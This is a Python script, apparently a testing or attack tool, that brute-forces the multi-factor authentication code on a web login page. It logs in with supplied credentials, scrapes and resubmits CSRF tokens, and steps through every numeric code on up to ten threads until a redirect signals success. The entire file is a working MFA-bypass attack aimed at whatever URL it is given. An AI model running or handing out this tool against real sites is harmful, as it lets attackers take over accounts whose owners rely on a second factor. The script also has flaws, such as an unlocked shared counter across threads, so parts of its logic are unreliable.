#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import threading
import argparse
#from multiprocessing.dummy import Pool as ThreadPool

#Establish the session command for use with multiple requests
client = requests.session()

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--username', type=str)
parser.add_argument('-p', '--password', type=str)
parser.add_argument("--url", type=str, help="Full Url to login page")
parser.add_argument("-m", "--mfachars", type=int, help="Number of characters in the MFA code")

args = parser.parse_args()

username = args.username
password = args.password
url = args.url
mfachars = str(args.mfachars)


#Set required arguments if they were not defined
if url == None:
	url = input("Please provide the full url for the login page you would like to test: ")
if username == None:
	username = str(input("Please provide the username to use for login: "))
if password == None:
	password = str(input("Please provide the password to use for login: "))
if mfachars == None:
	mfachars = str(input("How many characters are in the MFA code?: "))


# Set the initial mfa integer
mfa = 0
mfanumber = "{0:0" + mfachars + "}"
nicemfa = mfanumber.format(mfa)


# Set login2 to None for conflict resolution
login2 = ""
	 

def lookup():
	#Perform a get request against the ip to check if the host is up
	test = client.get(url)

	if test.status_code == 200:
		print("The site is up.")
		# if the host is up and available, establish the path to the page that grants the csrf token
		global check
		soup = BeautifulSoup(test.content, "html.parser")
		check = soup.find("input", {"name":"csrf"}) ["value"]
		if check != None:
			print("Found csrf token on page, automatically discovering and adding token to requests.")
			gather_csrf1()
			requestflow()
			login()
			gather_csrf2()
			requestflow()
			mfa_brute()
		else:
			requestflow()
			login()
			requestflow()
			threads()

	else:
		print("Something went wrong, the site may not be up")




def gather_csrf1():
	#Create the full link to the csrf granting page
	csrf =  client.get(url)
	#Sends the content of the csrf page response to BeautifulSoup for parsing
	soup = BeautifulSoup(csrf.content, "html.parser")
	global token1
	#Searches for a line beginning with input, then searches those lines for any that contain the csrf token, setting the variable to the value of that token
	token1 = soup.find("input", {"name":"csrf"}) ["value"]


def gather_csrf2():
	#Create the full link to the csrf granting page
	csrf =  client.get(login2)
	#Sends the content of the csrf page response to BeautifulSoup for parsing
	soup = BeautifulSoup(csrf.content, "html.parser")
	global token2
	#Searches for a line beginning with input, then searches those lines for any that contain the csrf token, setting the variable to the value of that token
	token2 = soup.find("input", {"name":"csrf"}) ["value"]



def login():
	login = client.post(url, data=data1)
	global login2
	login2 = login.url


# New/Potentially much more efficient way of creating threading for 
# def threads2():
# 	pool = ThreadPool(16)
# 	codetest = pool.map(mfa_brute)
# 	pool.close()
# 	pool.join()

def threads():
	t1 = threading.Thread(target=mfa_brute)
	t2 = threading.Thread(target=mfa_brute)
	t3 = threading.Thread(target=mfa_brute)
	t4 = threading.Thread(target=mfa_brute)
	t5 = threading.Thread(target=mfa_brute)
	t6 = threading.Thread(target=mfa_brute)
	t7 = threading.Thread(target=mfa_brute)
	t8 = threading.Thread(target=mfa_brute)
	t9 = threading.Thread(target=mfa_brute)
	t10 = threading.Thread(target=mfa_brute)
	t1.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
	t6.start()
	t7.start()
	t8.start()
	t9.start()
	t10.start()
	t1.join()
	t2.join()
	t3.join()
	t4.join()
	t5.join()
	t6.join()
	t7.join()
	t8.join()
	t9.join()
	t10.join()






def requestor():
	if url != "":
		requestor_part1()
		if login2 != "":
			requestor_part2()
	
def requestor_part1():
	global data1
	if url != "":
		data1 = ""
		request1 = client.get(url)
		soup = BeautifulSoup(request1.content, "html.parser")
		inputkey1 = soup.findAll('input')
		for input in inputkey1:
			data1 += str(input.attrs['name'])
			data1 += "="
			if "user" in input.attrs['name']:
				data1 += username
			elif "pass" in input.attrs['name']:
				data1 += password
			elif "csrf" in input.attrs['name']:
				data1 += token1
			else:
				data1 += input.attrs['value']
			data1 += "&"	

def requestor_part2():
	global data2
	if login2 != "":
		data2 = ""
		soup = BeautifulSoup(request2.content, "html.parser")
		inputkey2 = soup.findAll('input')
		for input in inputkey2:
			data2 += str(input.attrs['name'])
			data2 += "="
			if "user" in input.attrs['name']:
				data2 += username
			elif "pass" in input.attrs['name']:
				data2 += password
			elif "csrf" in input.attrs['name']:
				data2 += token2
			elif "mfa" in input.attrs['name']:
				continue
			data2 += "&"


def makerequests():
	if url != "":
		global request1
		request1 = client.get(url)

	if login2 != "":
		global request2
		request2 = client.get(login2)


def requestflow():
	makerequests()
	requestor()


def mfa_brute():
	global mfa
	global nicemfa
	global mfanumber

	if check != None:
		gather_csrf1()
		gather_csrf2()
		requestor()
		print(data2)
		mfa_attempt = client.post(login2, data=data2 + nicemfa)
		print(data2 + nicemfa)
		while not mfa_attempt.status_code == 302:
			gather_csrf1()
			login()
			gather_csrf2()
			requestor()
			mfa += 1
			nicemfa = mfanumber.format(mfa)
			print("Testing: " + nicemfa)
			mfa_attempt = client.post(login2, data=data2 + nicemfa)
			if mfa_attempt.status_code == 302:
				print("MFA code found: " + nicemfa +"\n Program will now exit.")
				quit()
			elif mfa_attempt.status_code == 400:
				print("Error testing code: " + nicemfa + "\n Continuing, but note the error.")
			elif mfa_attempt.status_code != 200:
				print("Status code is not expected.  MFA code may be correct, or requests may be blocked or misconfigured.")
				
	else:
		mfa_attempt = client.post(login2, data=data2 + nicemfa)
		while not mfa_attempt.status_code == 302:
			login()
			mfa += 1
			nicemfa = mfanumber.format(mfa)
			print("Testing: " + nicemfa)
			mfa_attempt = client.post(login2, data=data2 + nicemfa)
			if mfa_attempt.status_code == 302:
				print("MFA code found: " + nicemfa +"\n Program will now exit.")
				quit()
			elif mfa_attempt.status_code == 400:
			 	print("Error testing code: " + nicemfa + "\n Continuing, but noting error.")
			elif mfa_attempt.status_code != 200:
				print("Status code is not expected.  MFA code may be correct, or requests may be blocked or misconfigured.")

lookup()